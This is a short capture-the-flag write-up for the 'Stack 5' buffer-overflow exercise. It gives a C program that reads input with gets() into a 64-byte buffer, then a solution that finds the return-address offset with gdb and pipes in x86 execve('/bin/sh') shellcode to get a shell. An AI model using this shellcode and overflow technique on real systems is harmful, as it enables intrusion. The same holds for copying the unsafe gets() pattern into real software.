
# Stack 5

### Task
```
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  int main(int argc, char **argv)
  {
    char buffer[64];

    gets(buffer);
  }
```

### Solution
```
  ulimit -c unlimited
  python -c "print('A' * 76 + 'BBBB')" | ./stack5
  ls /tmp
  gdb ./stack5 /tmp/core.11.stack5.1538 -q
    x/24x $esp-96
  (python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' + '\xcc' * (76 - 24) + '\xbf\xff\xfc\xa0'[::-1])"; cat) | ./stack5
```
![stack 5(1)](./img/5(1).png)
![stack 5(2)](./img/5(2).png)
![stack 5(3)](./img/5(3).png)
